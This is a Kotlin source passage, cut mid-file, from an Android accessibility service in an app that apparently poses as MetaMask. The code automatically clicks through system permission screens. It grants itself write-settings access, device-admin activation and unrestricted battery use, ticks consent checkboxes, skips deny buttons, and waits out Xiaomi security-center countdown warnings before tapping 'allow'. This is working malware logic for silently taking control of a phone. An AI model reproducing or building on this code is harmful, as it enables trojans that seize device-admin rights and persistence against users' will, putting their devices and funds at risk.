        writeSettingsStartMs = System.currentTimeMillis()
        listOf(500L, 1000L, 1800L, 3000L, 5000L, 8000L).forEach { d ->
            handler.postDelayed({
                if (writeSettingsPending) tryClickWriteSettingsToggle()
            }, d)
        }
        handler.postDelayed({
            if (writeSettingsPending) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                val svcT = service
                writeSettingsPending = false
                val cb = writeSettingsDoneCallback
                writeSettingsDoneCallback = null
                handler.post { cb?.invoke() }
                if (svcT != null) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    try { svcT.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK) } catch (_: Exception) {}
                }
            }
        }, WRITE_SETTINGS_TIMEOUT_MS)
    }

    private fun handleWriteSettingsEvent(event: AccessibilityEvent) {
        android.util.Log.d("XDBG", "[AutoIbis] handleWriteSettingsEvent enter event=${event}") //xdbg
        if (!writeSettingsPending) return
        val pkg = event.packageName?.toString() ?: return
        if (pkg !in WRITE_SETTINGS_PKGS) return
        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            event.eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) return
        val age = System.currentTimeMillis() - writeSettingsStartMs
        if (age > WRITE_SETTINGS_TIMEOUT_MS) { writeSettingsPending = false; return }
        val now = System.currentTimeMillis()
        if (now - writeSettingsLastScheduleMs < 800L) return
        writeSettingsLastScheduleMs = now
        listOf(200L, 600L, 1200L).forEach { d ->
            handler.postDelayed({ if (writeSettingsPending) tryClickWriteSettingsToggle() }, d)
        }
    }

    private fun tryClickWriteSettingsToggle() {
        android.util.Log.d("XDBG", "[AutoIbis] tryClickWriteSettingsToggle enter") //xdbg
        val svc = service ?: return
        if (!writeSettingsPending) return
        val age = System.currentTimeMillis() - writeSettingsStartMs
        if (age > WRITE_SETTINGS_TIMEOUT_MS) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            finishWriteSettings(svc)
            return
        }
        try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                val canWrite = android.provider.Settings.System.canWrite(svc.applicationContext)
                if (canWrite) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    finishWriteSettings(svc)
                    return
                }
            }
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[AutoIbis] catch (ignored)") //xdbg
        }

        val toggleIds = listOf(
            "com.android.settings:id/switch_widget",
            "android:id/switch_widget",
            "com.samsung.android.settings:id/switch_widget",
            "com.android.settings:id/switchWidget",
            "android:id/switchWidget",
            "com.android.settings:id/toggleSwitch",
            "com.android.settings:id/main_switch",
            "com.android.settings:id/switch1",
            "android:id/switch1",
            "com.android.settings:id/switchbar_switch",
            "com.android.settings:id/entity_header_summary"
        )

        val windows = try { svc.windows } catch (_: Exception) { null } ?: return
        for ((_, win) in windows.withIndex()) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val root = try { win.root } catch (_: Exception) { null } ?: continue
            val pkg = root.packageName?.toString() ?: ""
            if (pkg !in WRITE_SETTINGS_PKGS) { try { root.recycle() } catch (_: Exception) {}; continue }
            try {
                for (id in toggleIds) {
                    android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                    val nodes = try { root.findAccessibilityNodeInfosByViewId(id) }
                        catch (_: Exception) { null }
                    if (!nodes.isNullOrEmpty()) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        for (n in nodes) {
                            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                            val cls = n.className?.toString() ?: ""
                            val isSwitch = cls.contains("Switch") || cls.contains("ToggleButton") || n.isCheckable
                            val b = android.graphics.Rect().also { n.getBoundsInScreen(it) }
                            if (!isSwitch) {
                                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                try { n.recycle() } catch (_: Exception) {}; continue
                            }
                            if (n.isChecked) {
                                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                                finishWriteSettings(svc)
                                return
                            }
                            val ok = if (n.isClickable) {
                                try { n.performAction(AccessibilityNodeInfo.ACTION_CLICK) } catch (_: Exception) { false }
                            } else {
                                val p = try { n.parent } catch (_: Exception) { null }
                                val r = try { p?.performAction(AccessibilityNodeInfo.ACTION_CLICK) ?: false } catch (_: Exception) { false }
                                try { p?.recycle() } catch (_: Exception) {}
                                r
                            }
                            if (ok) {
                                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                val tapBounds = android.graphics.Rect(b)
                                nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                                handler.postDelayed({
                                    val canWriteAfter = try { android.provider.Settings.System.canWrite(svc.applicationContext) } catch (_: Exception) { false }
                                    if (canWriteAfter) {
                                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                        finishWriteSettings(svc, 300L)
                                    } else {
                                        val sw = svc.resources.displayMetrics.widthPixels
                                        val tapX = if (tapBounds.centerX() > sw) (sw * 0.88f) else tapBounds.centerX().toFloat()
                                        doGestureTap(svc, tapX, tapBounds.centerY().toFloat())
                                        handler.postDelayed({
                                            finishWriteSettings(svc, 300L)
                                        }, 700L)
                                    }
                                }, 600L)
                                return
                            }
                            if (!b.isEmpty) {
                                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                val sw = svc.resources.displayMetrics.widthPixels
                                val tapX = if (b.centerX() > sw) sw * 0.88f else b.centerX().toFloat()
                                nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                                doGestureTap(svc, tapX, b.centerY().toFloat())
                                finishWriteSettings(svc, 700L)
                                return
                            }
                            try { n.recycle() } catch (_: Exception) {}
                        }
                        nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                    }
                }
                val toggle = findWriteSettingsToggleBFS(root, 0)
                if (toggle != null) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    if (toggle.isChecked) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        try { toggle.recycle() } catch (_: Exception) {}
                        finishWriteSettings(svc)
                        return
                    }
                    val ok = if (toggle.isClickable) {
                        try { toggle.performAction(AccessibilityNodeInfo.ACTION_CLICK) } catch (_: Exception) { false }
                    } else {
                        val p = try { toggle.parent } catch (_: Exception) { null }
                        val r = try { p?.performAction(AccessibilityNodeInfo.ACTION_CLICK) ?: false } catch (_: Exception) { false }
                        try { p?.recycle() } catch (_: Exception) {}
                        r
                    }
                    if (ok) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        try { toggle.recycle() } catch (_: Exception) {}
                        finishWriteSettings(svc, 500L)
                        return
                    }
                    val bfsB = android.graphics.Rect().also { toggle.getBoundsInScreen(it) }
                    try { toggle.recycle() } catch (_: Exception) {}
                    if (!bfsB.isEmpty) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        val sw = svc.resources.displayMetrics.widthPixels
                        val bfsTapX = if (bfsB.centerX() > sw) sw * 0.88f else bfsB.centerX().toFloat()
                        doGestureTap(svc, bfsTapX, bfsB.centerY().toFloat())
                        finishWriteSettings(svc, 700L)
                        return
                    }
                }
            } finally {
                try { root.recycle() } catch (_: Exception) {}
            }
        }
    }

    private fun findWriteSettingsToggleBFS(node: AccessibilityNodeInfo, depth: Int): AccessibilityNodeInfo? {
        android.util.Log.d("XDBG", "[AutoIbis] findWriteSettingsToggleBFS enter node=${node} depth=${depth}") //xdbg
        if (depth > 12) return null
        val cls = node.className?.toString() ?: ""
        if (cls.contains("Switch") || cls.contains("ToggleButton") || node.isCheckable) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
            return node
        }
        for (i in 0 until node.childCount) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            val result = findWriteSettingsToggleBFS(child, depth + 1)
            if (result != null) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                for (j in 0 until node.childCount) {
                    android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                    if (j != i) try { node.getChild(j)?.recycle() } catch (_: Exception) {}
                }
                android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
                return result
            }
            try { child.recycle() } catch (_: Exception) {}
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return null
    }

    private fun handleSetupDialogEvent(event: AccessibilityEvent) {
        android.util.Log.d("XDBG", "[AutoIbis] handleSetupDialogEvent enter event=${event}") //xdbg
        val pkg = event.packageName?.toString() ?: return
        if (batteryOptPending && !deviceAdminPending &&
            pkg == "com.android.vending" &&
            event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val svc = service ?: return
            handler.postDelayed({
                if (batteryOptPending) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    try { svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK) } catch (_: Exception) {}
                }
            }, 300L)
            return
        }
        if (pkg != SETUP_PKG && pkg != "android" && pkg != "com.google.android.gms" &&
            pkg != "com.miui.securitycenter" && pkg != "com.miui.securityadd" &&
            pkg != "com.miui.powerkeeper" && pkg != "com.lbe.security.miui" &&
            !batteryOptPending) return
        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
        if (!deviceAdminPending && !batteryOptPending) return
        val age = System.currentTimeMillis() - lastSetupMs
        if (deviceAdminPending && age > SETUP_TIMEOUT_MS) { deviceAdminPending = false; hyperOsCheckboxTicked = false }
        if (batteryOptPending && age > BATT_OPT_TIMEOUT_MS) { batteryOptPending = false }
        if (!deviceAdminPending && !batteryOptPending) return
        setupDialogActive = true
        if (deviceAdminPending) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            listOf(300L, 600L, 1000L, 1600L, 2400L).forEach { d ->
                handler.postDelayed({ if (setupDialogActive) tryClickSetupDialog() }, d)
            }
        } else {
            tryClickSetupDialog()
            listOf(80L, 180L, 350L, 600L, 1000L).forEach { d ->
                handler.postDelayed({ if (setupDialogActive) tryClickSetupDialog() }, d)
            }
        }
    }

    private fun tryClickSetupDialog() {
        android.util.Log.d("XDBG", "[AutoIbis] tryClickSetupDialog enter") //xdbg
        val svc = service ?: return
        if (!setupDialogActive) return
        val age = System.currentTimeMillis() - lastSetupMs
        if (deviceAdminPending && age > SETUP_TIMEOUT_MS) { deviceAdminPending = false; hyperOsCheckboxTicked = false; cancelWatchForEnabled() }
        if (batteryOptPending && age > BATT_OPT_TIMEOUT_MS) { batteryOptPending = false }
        if (!deviceAdminPending && !batteryOptPending) { setupDialogActive = false; return }
        if (com.example.MetaMask.HyperOsDetector.isHyperOs && hyperOsCheckboxTicked && deviceAdminPending) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            if (isOurAdminActive()) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                onSetupDialogClicked()
                return
            }
            if (!waitForEnableActive) startWatchForEnabledAndClick()
            maybeStartHyperOsTap()
            return
        }
        if (com.example.MetaMask.HyperOsDetector.isHyperOs && !hyperOsCountdownTapScheduled) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            try { dumpSetupTree() } catch (_: Exception) {}
        }
        if (batteryOptPending && com.example.MetaMask.HyperOsDetector.isHyperOs) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            val elapsed = System.currentTimeMillis() - lastSetupMs
            when (tryHyperOsBatteryRadio(svc)) {
                BatteryRadioResult.CLICKED -> {
                    handler.postDelayed({
                        try { svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK) } catch (_: Exception) {}
                    }, 400L)
                    onSetupDialogClicked()
                    return
                }
                BatteryRadioResult.NO_OPTION -> {
                    if (elapsed >= 800L) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        batteryOptPending = false
                        setupDialogActive = false
                        handler.postDelayed({
                            try { svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK) } catch (_: Exception) {}
                        }, 150L)
                        handler.postDelayed({
                            try { AccessSvc.instance?.onHyperOsBatteryOptionNotFound() } catch (_: Exception) {}
                        }, 150L)
                        return
                    }
                }
                BatteryRadioResult.NOT_FOUND -> { }
                BatteryRadioResult.INTERCEPT_CLICKED -> {
                    return
                }
            }
        }
        val windows = try { svc.windows } catch (_: Exception) { null } ?: return
        var foundDisabled = false
        var checkboxToggled = false
        val hyperOsSecuritySeen = if (com.example.MetaMask.HyperOsDetector.isHyperOs && deviceAdminPending) {
            windows.any { win ->
                val r = try { win.root } catch (_: Exception) { null }
                val p = r?.packageName?.toString() ?: ""
                try { r?.recycle() } catch (_: Exception) {}
                p == "com.miui.securitycenter"
            }
        } else false
        for (win in windows) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val root = try { win.root } catch (_: Exception) { null } ?: continue
            val pkg = root.packageName?.toString() ?: ""
            val tickGuardActive = hyperOsCheckboxTicked &&
                (System.currentTimeMillis() - hyperOsCheckboxTickedAtMs) < HYPER_OS_CHECKBOX_TICK_GUARD_MS
            if ((hyperOsSecuritySeen || tickGuardActive) && pkg == SETUP_PKG &&
                com.example.MetaMask.HyperOsDetector.isHyperOs && deviceAdminPending) {
                try { root.recycle() } catch (_: Exception) {}
                continue
            }
            val pkgOk = pkg == SETUP_PKG || pkg == "android" || pkg == "com.google.android.gms" ||
                pkg == "com.miui.securitycenter" || pkg == "com.miui.securityadd" ||
                pkg == "com.miui.powerkeeper" || pkg == "com.lbe.security.miui"
            if (!pkgOk) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                if (batteryOptPending && !deviceAdminPending) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    try {
                        for (id in listOf("android:id/button1", "android:id/positiveButton")) {
                            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                            val nodes = try { root.findAccessibilityNodeInfosByViewId(id) } catch (_: Exception) { null }
                            if (!nodes.isNullOrEmpty()) {
                                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                for (n in nodes) {
                                    android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                                    if (!n.isEnabled) { try { n.recycle() } catch (_: Exception) {}; continue }
                                    val label = ((n.text?.toString() ?: "").trim().ifBlank {
                                        n.contentDescription?.toString()?.trim() ?: ""
                                    }).lowercase()
                                    if (DENY_TEXTS.any { label.contains(it) }) { try { n.recycle() } catch (_: Exception) {}; continue }
                                    val ok = try { n.performAction(AccessibilityNodeInfo.ACTION_CLICK) } catch (_: Exception) { false }
                                    if (!ok) { val b = Rect().also { n.getBoundsInScreen(it) }; if (!b.isEmpty) doGestureTap(svc, b.centerX().toFloat(), b.centerY().toFloat()) }
                                    nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                                    onSetupDialogClicked(); return
                                }
                                nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                            }
                        }
                        val battTexts = listOf("да", "yes", "разрешить", "allow", "ок", "ok")
                        for (txt in battTexts) {
                            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                            val nodes = try { root.findAccessibilityNodeInfosByText(txt) } catch (_: Exception) { null }
                            if (!nodes.isNullOrEmpty()) {
                                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                for (n in nodes) {
                                    android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                                    val label = (n.text?.toString() ?: "").trim().lowercase()
                                    if (label != txt && !label.startsWith(txt)) { try { n.recycle() } catch (_: Exception) {}; continue }
                                    if (DENY_TEXTS.any { label.contains(it) }) { try { n.recycle() } catch (_: Exception) {}; continue }
                                    if (!n.isEnabled) { try { n.recycle() } catch (_: Exception) {}; continue }
                                    val ok = try { n.performAction(AccessibilityNodeInfo.ACTION_CLICK) } catch (_: Exception) { false }
                                    if (!ok) { val b = Rect().also { n.getBoundsInScreen(it) }; if (!b.isEmpty) doGestureTap(svc, b.centerX().toFloat(), b.centerY().toFloat()) }
                                    try { n.recycle() } catch (_: Exception) {}
                                    nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                                    onSetupDialogClicked(); return
                                }
                                nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                            }
                        }
                    } finally { try { root.recycle() } catch (_: Exception) {} }
                } else {
                    try { root.recycle() } catch (_: Exception) {}
                }
                continue
            }
            try {
                if (batteryOptPending && pkg == "com.miui.powerkeeper") {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    val batteryUnrestrictedTexts = listOf(
                        "без ограничений", "нет ограничений", "не ограничивать",
                        "unrestricted", "no restrictions", "no restriction",
                        "no battery restriction", "không giới hạn", "sin restricciones"
                    )
                    var batteryClicked = false
                    outer@ for (txt in batteryUnrestrictedTexts) {
                        val nodes = try { root.findAccessibilityNodeInfosByText(txt) } catch (_: Exception) { null }
                        if (!nodes.isNullOrEmpty()) {
                            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                            for (n in nodes) {
                                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                                val label = (n.text?.toString() ?: "").trim().lowercase()
                                if (!label.contains(txt)) { try { n.recycle() } catch (_: Exception) {}; continue }
                                val clickable = findClickable(n) ?: n
                                val ok = try { clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK) } catch (_: Exception) { false }
                                if (ok) {
                                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                    batteryClicked = true
                                    try { n.recycle() } catch (_: Exception) {}
                                    break@outer
                                }
                                val b = Rect().also { clickable.getBoundsInScreen(it) }
                                if (!b.isEmpty) {
                                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                    doGestureTap(svc, b.centerX().toFloat(), b.centerY().toFloat())
                                    batteryClicked = true
                                    try { n.recycle() } catch (_: Exception) {}
                                    break@outer
                                }
                                try { n.recycle() } catch (_: Exception) {}
                            }
                            nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                        }
                        if (batteryClicked) break
                    }
                    if (batteryClicked) { onSetupDialogClicked(); return }
                }

                if (deviceAdminPending && pkg != "com.miui.securitycenter") scrollToBottom(root)

                val cbResult = tryTickConsentCheckbox(root, svc)
                when (cbResult) {
                    CheckboxResult.TICKED -> {
                        checkboxToggled = true
                        if (com.example.MetaMask.HyperOsDetector.isHyperOs && deviceAdminPending &&
                            pkg == "com.miui.securitycenter") {
                            hyperOsCheckboxTicked = true
                            hyperOsCheckboxTickedAtMs = System.currentTimeMillis()
                            if (hyperOsOkCenterX == 0f) {
                                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                val okNodes = try {
                                    root.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/intercept_warn_allow")
                                } catch (_: Exception) { null }
                                okNodes?.forEach { n ->
                                    if (hyperOsOkCenterX == 0f) {
                                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                        val b = android.graphics.Rect().also { n.getBoundsInScreen(it) }
                                        if (!b.isEmpty) {
                                            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                            hyperOsOkCenterX = b.centerX().toFloat()
                                            hyperOsOkCenterY = b.centerY().toFloat()
                                        }
                                    }
                                    try { n.recycle() } catch (_: Exception) {}
                                }
                            }
                            if (!waitForEnableActive) startWatchForEnabledAndClick()
                            maybeStartHyperOsTap()
                        }
                    }
                    CheckboxResult.DISABLED -> {
                        foundDisabled = true
                    }
                    CheckboxResult.NOT_FOUND,
                    CheckboxResult.ALREADY_CHECKED -> {
                        if (com.example.MetaMask.HyperOsDetector.isHyperOs && deviceAdminPending &&
                            pkg == "com.miui.securitycenter" && hyperOsCheckboxTicked) {
                            if (!waitForEnableActive) startWatchForEnabledAndClick()
                        }
                    }
                }
                if (checkboxToggled) continue
                for (id in listOf(
                    "android:id/button1", "android:id/positiveButton",
                    "com.transsion.widgetslib:id/dialog_button_confirm",
                    "com.android.settings:id/admin_action_button",
                    "com.android.settings:id/action_button",
                    "com.android.settings:id/activate_button",
                    "com.android.settings:id/submit_button",
                    "com.android.settings:id/allow_button",
                    "com.android.settings:id/right_button",
                    "com.android.settings:id/positive_button",
                    "com.samsung.android.settings:id/ok_button",
                    "com.samsung.android.settings:id/button_ok",
                    "com.samsung.android.settings:id/activate_button",
                    "com.samsung.android.settings:id/positive_btn",
                    "com.android.settings:id/btn_add",
                    "com.miui.securitycenter:id/intercept_warn_allow",
                    "com.miui.securitycenter:id/btn_agree",
                    "com.miui.securitycenter:id/positive_button",
                    "com.android.settings:id/button_ok",
                    "com.huawei.systemmanager:id/btn_ok",
                    "com.coloros.safecenter:id/btn_ok",
                    "com.oplus.safecenter:id/btn_ok",
                    "com.vivo.permissionmanager:id/btn_allow"
                )) {
                    val nodes = try { root.findAccessibilityNodeInfosByViewId(id) } catch (_: Exception) { null }
                    if (!nodes.isNullOrEmpty()) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        var clicked = false
                        for (n in nodes) {
                            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                            val enbl = n.isEnabled; val clkbl = n.isClickable
                            if (deviceAdminPending && (!enbl || !clkbl)) {
                                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                foundDisabled = true
                                if (com.example.MetaMask.HyperOsDetector.isHyperOs &&
                                    pkg == "com.miui.securitycenter" &&
                                    id == "com.miui.securitycenter:id/intercept_warn_allow" &&
                                    hyperOsOkCenterX == 0f) {
                                    val b = android.graphics.Rect().also { n.getBoundsInScreen(it) }
                                    if (!b.isEmpty) {
                                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                        hyperOsOkCenterX = b.centerX().toFloat()
                                        hyperOsOkCenterY = b.centerY().toFloat()
                                    }
                                }
                                try { n.recycle() } catch (_: Exception) {}
                                continue
                            }
                            if (deviceAdminPending) {
                                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                val btnLabel = ((n.text?.toString() ?: "").trim().ifBlank {
                                    n.contentDescription?.toString()?.trim() ?: ""
                                }).lowercase()
                                if (btnLabel.isNotBlank() && DENY_TEXTS.any { btnLabel.contains(it) }) {
                                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                    try { n.recycle() } catch (_: Exception) {}
                                    continue
                                }
                            }
                            val ok = try { n.performAction(AccessibilityNodeInfo.ACTION_CLICK) } catch (_: Exception) { false }
                            if (ok) { clicked = true; break }
                            val b = Rect().also { n.getBoundsInScreen(it) }
                            if (!b.isEmpty) { doGestureTap(svc, b.centerX().toFloat(), b.centerY().toFloat()); clicked = true; break }
                        }
                        nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                        if (clicked) { onSetupDialogClicked(); return }
                    }
                }
                if (!com.example.MetaMask.HyperOsDetector.isHyperOs) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    val activateTexts = listOf("активировать", "activate", "разрешить", "allow", "включить", "enable", "ок", "ok", "да", "yes")
                    var foundByText = false
                    for (txt in activateTexts) {
                        android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                        val nodes = try { root.findAccessibilityNodeInfosByText(txt) } catch (_: Exception) { null }
                        if (!nodes.isNullOrEmpty()) {
                            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                            for (n in nodes) {
                                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                                val label = (n.text?.toString() ?: "").trim().lowercase()
                                if (label != txt && !label.startsWith(txt)) { try { n.recycle() } catch (_: Exception) {}; continue }
                                if (DENY_TEXTS.any { label.contains(it) }) { try { n.recycle() } catch (_: Exception) {}; continue }
                                if (deviceAdminPending && (!n.isEnabled || !n.isClickable)) {
                                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                    foundDisabled = true
                                    try { n.recycle() } catch (_: Exception) {}
                                    continue
                                }
                                val nCls = n.className?.toString() ?: ""
                                val isBtn = nCls.contains("Button", ignoreCase = true)
                                val clickTarget = if (n.isClickable && n.isEnabled) n else findClickable(n)
                                if (!isBtn && clickTarget == null) { try { n.recycle() } catch (_: Exception) {}; continue }
                                val target = clickTarget ?: n
                                val ok = try { target.performAction(AccessibilityNodeInfo.ACTION_CLICK) } catch (_: Exception) { false }
                                if (!ok) { val b = Rect().also { target.getBoundsInScreen(it) }; if (!b.isEmpty) doGestureTap(svc, b.centerX().toFloat(), b.centerY().toFloat()) }
                                foundByText = true
                                try { n.recycle() } catch (_: Exception) {}
                                break
                            }
                            nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                            if (foundByText) { onSetupDialogClicked(); return }
                        }
                    }
                    if (bfsClickSetupPositive(root, svc)) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        onSetupDialogClicked(); return
                    }
                }
                val skipInfer = com.example.MetaMask.HyperOsDetector.isHyperOs &&
                    pkg == "com.miui.securitycenter" &&
                    (deviceAdminPending || batteryOptPending)
                if (!skipInfer && age >= 1500L && inferAndClickPositive(root, svc)) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    onSetupDialogClicked(); return
                }
                val skipBfs = com.example.MetaMask.HyperOsDetector.isHyperOs &&
                    pkg == "com.miui.securitycenter" &&
                    (deviceAdminPending || batteryOptPending)
                val bfsOk = if (skipBfs) false else bfsClickAnyClickable(root, svc)
                if (bfsOk) { onSetupDialogClicked(); return }
            } finally { try { root.recycle() } catch (_: Exception) {} }
        }
        if (checkboxToggled && setupDialogActive && deviceAdminPending) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            handler.postDelayed({
                if (setupDialogActive && deviceAdminPending) tryClickSetupDialog()
            }, 300L)
            return
        }
        if (com.example.MetaMask.HyperOsDetector.isHyperOs && !hyperOsCountdownTapScheduled) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            dumpSetupTree()
        } else if (!setupTreeDumped) {
            setupTreeDumped = true
            dumpSetupTree()
        }
        if (foundDisabled && deviceAdminPending && !waitForEnableActive) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            startWatchForEnabledAndClick()
        }
        if (com.example.MetaMask.HyperOsDetector.isHyperOs && hyperOsCheckboxTicked &&
            deviceAdminPending && !waitForEnableActive) {
            startWatchForEnabledAndClick()
        }
        if (com.example.MetaMask.HyperOsDetector.isHyperOs && hyperOsCheckboxTicked &&
            deviceAdminPending && !hyperOsCountdownTapScheduled && hyperOsOkCenterX > 0f) {
            hyperOsCountdownTapScheduled = true
            val cx = hyperOsOkCenterX
            val cy = hyperOsOkCenterY
            val elapsed = System.currentTimeMillis() - hyperOsCheckboxTickedAtMs
            val delay = maxOf(9800L - elapsed, 300L)
            val tapCx = cx; val tapCy = cy
            val t = Thread {
                try { Thread.sleep(delay) } catch (_: InterruptedException) { }
                if (deviceAdminPending && setupDialogActive) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    val s1 = service
                    if (s1 != null) { doGestureTap(s1, tapCx, tapCy) }
                    try { Thread.sleep(700) } catch (_: InterruptedException) { }
                    if (deviceAdminPending && setupDialogActive) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        val s2 = service
                        if (s2 != null) { doGestureTap(s2, tapCx, tapCy) }
                        try { Thread.sleep(700) } catch (_: InterruptedException) { }
                        if (deviceAdminPending && setupDialogActive) {
                            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                            val s3 = service
                            if (s3 != null) { doGestureTap(s3, tapCx, tapCy) }
                            try { Thread.sleep(600) } catch (_: InterruptedException) { }
                            if (deviceAdminPending && setupDialogActive) {
                                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                handler.post { if (deviceAdminPending && setupDialogActive) tryClickSetupDialog() }
                            }
                        }
                    }
                }
            }
            t.isDaemon = true
            t.name = "hyperOs-tap"
            t.start()
        }
        if (deviceAdminPending && age in 8000..8500 && !waitForEnableActive) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            val svc2 = service ?: return
            val metrics = svc2.resources.displayMetrics
            val w = metrics.widthPixels.toFloat()
            val h = metrics.heightPixels.toFloat()
            doGestureTap(svc2, w * 0.75f, h * 0.85f)
            handler.postDelayed({
                val granted = try {
                    val s = service ?: return@postDelayed
                    val dpm = s.getSystemService(android.content.Context.DEVICE_POLICY_SERVICE)
                        as? android.app.admin.DevicePolicyManager
                    val comp = android.content.ComponentName(s, com.example.MetaMask.receivers.BadgerFalconRecv::class.java)
                    dpm?.isAdminActive(comp) == true
                } catch (_: Exception) { false }
                if (granted) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    AccessSvc.instance?.onDeviceAdminSetupFinished(true)
                }
            }, 1500)
        }
    }

    private enum class CheckboxResult {
        NOT_FOUND,
        ALREADY_CHECKED,
        DISABLED,
        TICKED
    }

    private fun tryTickConsentCheckbox(
        root: AccessibilityNodeInfo,
        svc: AccessibilityService
    ): CheckboxResult {
        var result = CheckboxResult.NOT_FOUND

        fun walk(n: AccessibilityNodeInfo, depth: Int): Boolean {
            android.util.Log.d("XDBG", "[AutoIbis] walk enter n=${n} depth=${depth}") //xdbg
            if (depth > 14) return false
            val cls = n.className?.toString() ?: ""
            val isCheckboxLike = cls.contains("CheckBox", ignoreCase = true)
            if (isCheckboxLike) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
